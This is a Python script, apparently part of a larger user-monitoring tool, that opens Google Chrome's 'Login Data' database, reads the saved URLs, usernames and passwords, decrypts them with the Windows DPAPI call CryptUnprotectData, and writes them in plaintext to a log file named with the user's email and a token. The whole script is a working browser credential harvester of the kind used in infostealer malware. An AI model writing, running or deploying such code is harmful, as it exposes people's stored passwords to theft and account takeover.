import os, errno
import sqlite3
import win32crypt  # pypiwin32
import sys
from getsqldata import *
from datetime import datetime


uid = getCurrentUser()
conf = getRowValue('Setting',uid)
profile_path = conf[6]

# path to user's login data
user = os.path.expanduser('~')# + profile_path

## has not user in profile path
login_db = ''
if(profile_path.find(user) == -1):
    path = user + profile_path
    login_db = os.path.join(path, 'Login Data')
else:
    login_db = os.path.join(profile_path, 'Login Data')

print(login_db)

direc = os.path.join(conf[5],'Website')

token = getRowValue('current_user',uid)[1]
time = datetime.now().strftime('%Y_%m_%d')
email = getRowValue('Users',uid)[1]
name = time + '-' + email+ '-' + 'password-' + token + '.txt'
logs = os.path.join(direc , name)
#or full path if not in same directory
# create file log
try:
    os.makedirs(direc)
except OSError as e:
    if e.errno != errno.EEXIST:
        raise

# create file log
try:
    if(os.path.exists(logs)):
        os.remove(logs)
    f = open(logs, 'x')
    f.close()
except :
    pass

info_list = []
try:
	connection = sqlite3.connect(login_db, timeout = 10)
	with connection:
		cursor = connection.cursor()
		v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
		value = v.fetchall()

	if (os.name == "posix") and (sys.platform == "darwin"):
		print("Mac OSX not supported.")
		sys.exit(0)

	for information in value:
		if os.name == 'nt':
			password = win32crypt.CryptUnprotectData(
				information[2], None, None, None, 0)[1]
			if password:
				info_list.append({
					'origin_url': information[0],
					'username': information[1],
					'password': str(password)
				})

		elif os.name == 'posix':
			info_list.append({
				'origin_url': information[0],
				'username': information[1],
				'password': information[2]
			})

except sqlite3.OperationalError as e:
	e = str(e)
	if (e == 'database is locked'):
		print('[!] Make sure Google Chrome is not running in the background')
		sys.exit(0)
	elif (e == 'no such table: logins'):
		print('[!] Something wrong with the database name')
		sys.exit(0)
	elif (e == 'unable to open database file'):
		print('[!] Something wrong with the database path')
		sys.exit(0)
	else:
		print(e)
		sys.exit(0)

with open(logs, 'a', encoding='utf-8') as f:
        for element in info_list:
                f.write(str(element)+'\n')
                #print(element)
